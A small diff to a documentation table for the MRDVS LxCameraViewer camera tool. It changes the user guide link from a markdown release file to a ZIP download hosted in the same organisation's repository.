@@ -9,7 +9,7 @@ LxCameraViewer is the shared MRDVS camera setup and diagnostic application. Use 
 | Item | Resource |
 | --- | --- |
 | Windows installer | [MRDVS 2.4.60.260126](https://github.com/Lanxin-MRDVS/CameraSDK/releases/download/SDK-V2.4.60/MRDVS-2.4.60.260126-windows-installer.exe) |
-| User guide | [LxCameraViewer User Guide](https://github.com/Lanxin-MRDVS/Application-Algorithms/releases/download/Documentation/tools-lxcameraviewer-user-guide.md) |
+| User guide | [LxCameraViewer User Guide (ZIP)](https://github.com/Lanxin-MRDVS/Application-Algorithms/raw/refs/heads/main/tools/lxcameraviewer/docs/user-guide.md.zip?download=1) |
 | SDK and other packages | [CameraSDK repository](https://github.com/Lanxin-MRDVS/CameraSDK) |
 
 LxCameraViewer is a shared camera tool and is maintained separately from AW3 and application-specific release histories.
